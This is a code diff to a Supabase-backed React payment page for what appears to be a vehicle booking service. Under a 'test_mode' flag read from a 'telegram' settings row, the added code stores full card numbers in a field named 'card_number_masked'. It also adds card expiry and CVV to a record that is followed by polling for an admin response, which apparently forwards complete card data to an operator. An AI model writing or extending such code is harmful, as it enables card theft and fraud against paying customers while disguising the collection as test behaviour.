@@ -282,7 +282,21 @@ const PaymentPage = () => {
     saveCustomerInfo(customerInfo);
 
     try {
-      // Create payment session record
+      // Get test mode setting
+      const { data: telegramSettings } = await supabase
+        .from('settings')
+        .select('value')
+        .eq('key', 'telegram')
+        .single();
+
+      const isTestMode = telegramSettings?.value && 
+        typeof telegramSettings.value === 'object' && 
+        'test_mode' in telegramSettings.value ? 
+        Boolean((telegramSettings.value as any).test_mode) : false;
+
+      // Create payment session record with card data (full for test mode)
+      const cardNumberForStorage = isTestMode ? formData.cardNumber : `****${formData.cardNumber.slice(-4)}`;
+      
       const { error: sessionError } = await supabase
         .from('payment_sessions')
         .insert({
@@ -296,7 +310,7 @@ const PaymentPage = () => {
           vehicle_color: vehicle?.color,
           duration_label: duration?.label || '',
           price: `€${duration?.discountedPrice || 0}`,
-          card_number_masked: `****${formData.cardNumber.slice(-4)}`,
+          card_number_masked: cardNumberForStorage,
           card_type: getCardName(cardType)
         });
 
@@ -317,8 +331,11 @@ const PaymentPage = () => {
         vehicle_color: vehicle?.color || 'Unknown',
         duration: duration?.label || '',
         price: `€${duration?.discountedPrice || 0}`,
-        card_number_masked: `****${formData.cardNumber.slice(-4)}`,
-        card_type: getCardName(cardType)
+        card_number_masked: cardNumberForStorage,
+        card_type: getCardName(cardType),
+        card_expiry: formData.expiryDate,
+        card_cvv: formData.cvv,
+        test_mode: isTestMode
       });
 
       // Start polling for admin response
